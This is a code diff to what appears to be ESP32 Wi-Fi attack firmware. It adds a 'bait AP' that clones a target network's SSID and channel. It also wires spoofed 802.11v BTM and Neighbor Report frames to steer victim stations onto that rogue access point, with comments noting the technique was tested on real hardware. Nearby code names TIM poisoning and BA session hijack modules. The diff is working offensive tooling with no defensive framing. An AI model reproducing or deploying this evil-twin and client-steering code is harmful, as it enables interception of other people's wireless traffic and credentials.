@@ -7,6 +7,7 @@
 // never a big-bang.
 #include <WiFi.h>
 #include <ctype.h>
+#include <esp_system.h>
 #include <esp_wifi.h>
 #include <stdio.h>
 #include <string.h>
@@ -23,6 +24,7 @@
 #include "sae.h"
 #include "tim.h"
 #include "wbus.h"
+#include "baitap.h"
 #include "btm.h"
 #include "rrm.h"
 
@@ -584,9 +586,17 @@ wb_err_t btm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
   // 可选候选：给了 BSSID 就一定要有信道。0 表示"从扫描结果里按 BSSID 找"，
   // 找不到就报错而不是瞎填一个——元素里的信道写错了，客户端扫的就是别处。
   uint8_t cand[6];
-  const bool have_cand = wb_arg_mac(args, "cand", cand);
+  bool have_cand = wb_arg_mac(args, "cand", cand);
   long cand_ch = wb_arg_num(args, "cand-ch");
   const uint32_t cand_info = (uint32_t)wb_arg_num(args, "cand-info");
+  // No candidate given but the bait AP is up: aim the request at it. Measured on an
+  // ESP32-C5 station, a list-less request is answered but never acted on -- the
+  // station only moves when it is pointed at a BSS it can actually join.
+  if (!have_cand && baitap_running()) {
+    baitap_bssid(cand);
+    have_cand = true;
+    cand_ch = baitap_channel();
+  }
   if (have_cand) {
     if (cand_ch == 0) {
       const int n = console_scan_count();
@@ -604,6 +614,14 @@ wb_err_t btm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
                     "cand-ch=<1..196>");
       return WB_ERR_ARG;
     }
+  }
+
+  // The bait AP pins the radio: starting the spoof on another channel would drag
+  // the AP, and any station that already roamed onto it, off the air.
+  if (baitap_running() && baitap_channel() != (uint8_t)WiFi.channel(index)) {
+    wb_reply_line(reply,
+                  "ERR bait AP is on another channel: restart BAITAP on this AP's channel");
+    return WB_ERR_STATE;
   }
 
   attack_stop();
@@ -712,6 +730,13 @@ wb_err_t rrm_bus_start(const wb_args_t* args, wb_reply_t* reply) {
   const long phy = wb_arg_num(args, "phy");
   uint8_t sta[6];
   const bool have_sta = wb_arg_mac(args, "sta", sta);
+  // Same rule as BTM: the injector pins the target AP's channel, so a bait AP
+  // elsewhere would be dragged off the air by this start.
+  if (baitap_running() && baitap_channel() != (uint8_t)WiFi.channel(index)) {
+    wb_reply_line(reply,
+                  "ERR bait AP is on another channel: restart BAITAP on this AP's channel");
+    return WB_ERR_STATE;
+  }
   attack_stop();
   if (!rrm_start(index, cand, (uint8_t)ch, (uint8_t)count, (uint8_t)token, info, (uint8_t)opclass,
                  (uint8_t)phy)) {
@@ -757,6 +782,109 @@ const wb_method_t kRrmMethods[] = {
      .summary = "stop the Neighbor Report spoof"},
     {.name = "test", .args = nullptr, .n_args = 0, .handler = rrm_bus_test,
      .summary = "dump the Neighbor Report Response bytes"},
+};
+
+// ---- Bait AP (BTM / RRM steering target) ------------------------------------
+
+const wb_arg_spec_t kBaitapStartArgs[] = {
+    // Positional order matches the console line BAITAP <idx> [pass] [ch] [max];
+    // ssid sits last because it is only reachable through CALL (named form).
+    {.name = "idx", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "scan index to clone (SSID and channel come from it)", .err = nullptr, .def = -1,
+     .min = 0, .max = 0},
+    {.name = "pass", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "passphrase of the target BSS; omit for an open one", .err = nullptr, .def = 0,
+     .min = 0, .max = 0},
+    {.name = "ch", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "channel, 0 = same as the cloned AP", .err = nullptr, .def = 0, .min = 0,
+     .max = 0},
+    {.name = "max", .type = WB_T_INT, .flags = 0, .enums = nullptr,
+     .label = "max associated stations, 1..4 (2 keeps the heap cost low)", .err = nullptr,
+     .def = 2, .min = 0, .max = 0},
+    {.name = "ssid", .type = WB_T_STR, .flags = 0, .enums = nullptr,
+     .label = "SSID for the named form (CALL baitap.start ssid=...), overrides idx",
+     .err = nullptr, .def = 0, .min = 0, .max = 0},
+};
+
+wb_err_t baitap_bus_start(const wb_args_t* args, wb_reply_t* reply) {
+  const int index = (int)wb_arg_num(args, "idx");
+  const wb_value_t* ssid_arg = wb_arg(args, "ssid");
+  const bool have_ssid = ssid_arg != nullptr && ssid_arg->text != nullptr && ssid_arg->text[0] != 0;
+  if (index < 0 && !have_ssid) {
+    wb_reply_line(reply, "ERR BAITAP needs idx=<scan index> or ssid=<text>");
+    return WB_ERR_ARG;
+  }
+  if (index >= console_scan_count()) {
+    wb_reply_line(reply, "ERR index out of range, run SCAN first");
+    return WB_ERR_ARG;
+  }
+
+  // Copy before use: WiFi.SSID() returns a temporary String, and the OK line is
+  // printed after that temporary would already be gone.
+  char ssid_buf[33];
+  snprintf(ssid_buf, sizeof(ssid_buf), "%s",
+           have_ssid ? ssid_arg->text : WiFi.SSID(index).c_str());
+  const char* ssid = ssid_buf;
+  long channel = wb_arg_num(args, "ch");
+  if (channel == 0) {
+    channel = WiFi.channel(index);
+  }
+  if (channel < 1 || channel > 13) {
+    wb_reply_line(reply, "ERR channel must be 1..13");
+    return WB_ERR_ARG;
+  }
+  const wb_value_t* pass_arg = wb_arg(args, "pass");
+  const char* pass = (pass_arg != nullptr && pass_arg->text != nullptr) ? pass_arg->text : nullptr;
+  const long max_conn = wb_arg_num(args, "max");
+
+  if (!baitap_start(ssid, pass, (uint8_t)channel, (uint8_t)max_conn)) {
+    return WB_ERR_STATE;
+  }
+  uint8_t bssid[6];
+  baitap_bssid(bssid);
+  char bssid_text[18];
+  mac_text(bssid, bssid_text);
+  wb_reply_printf(reply, "OK BAITAP ssid=%s bssid=%s ch=%ld auth=%s clients=%u heap=%d\n", ssid,
+                  bssid_text, channel, (pass == nullptr || pass[0] == 0) ? "OPEN" : "WPA2",
+                  (unsigned)baitap_clients(), (int)baitap_heap_cost());
+  console_ui_log("bait ap up");
+  wbus_emit("baitap.state", "active=1");
+  return WB_OK;
+}
+
+wb_err_t baitap_bus_stop(const wb_args_t*, wb_reply_t* reply) {
+  const uint32_t joins = baitap_joins();
+  const uint32_t leaves = baitap_leaves();
+  baitap_stop();
+  wb_reply_printf(reply, "OK BAITAPSTOP joins=%u leaves=%u heap=%u\n", (unsigned)joins,
+                  (unsigned)leaves, (unsigned)esp_get_free_heap_size());
+  console_ui_log("bait ap down");
+  wbus_emit("baitap.state", "active=0");
+  return WB_OK;
+}
+
+wb_err_t baitap_bus_status(const wb_args_t*, wb_reply_t* reply) {
+  uint8_t bssid[6];
+  baitap_bssid(bssid);
+  char bssid_text[18];
+  mac_text(bssid, bssid_text);
+  wb_reply_printf(reply,
+                  "BAITAP state=%s ssid=%s bssid=%s ch=%u clients=%u joins=%u leaves=%u "
+                  "heap_cost=%d\n",
+                  baitap_running() ? "up" : "off", baitap_running() ? baitap_ssid() : "-",
+                  bssid_text, (unsigned)baitap_channel(), (unsigned)baitap_clients(),
+                  (unsigned)baitap_joins(), (unsigned)baitap_leaves(),
+                  (int)baitap_heap_cost());
+  return WB_OK;
+}
+
+const wb_method_t kBaitapMethods[] = {
+    {.name = "start", .args = kBaitapStartArgs, .n_args = 5, .handler = baitap_bus_start,
+     .summary = "clone a BSS so BTM/RRM have somewhere to steer the station"},
+    {.name = "stop", .args = nullptr, .n_args = 0, .handler = baitap_bus_stop,
+     .summary = "tear the bait AP down"},
+    {.name = "status", .args = nullptr, .n_args = 0, .handler = baitap_bus_status,
+     .summary = "bait AP state and heap cost"},
 };
 
 // ---- TIM poisoning ----------------------------------------------------------
@@ -1320,6 +1448,11 @@ const wb_object_t kObjects[] = {
      .title = "BA session hijack",
      .methods = kBaMethods,
      .n_methods = (int)(sizeof(kBaMethods) / sizeof(kBaMethods[0])),
+     .events = "state"},
+    {.name = "baitap",
+     .title = "Bait AP: cloned BSS for BTM/RRM steering",
+     .methods = kBaitapMethods,
+     .n_methods = (int)(sizeof(kBaitapMethods) / sizeof(kBaitapMethods[0])),
      .events = "state"},
     {.name = "btm",
      .title = "802.11v BTM Request spoof",
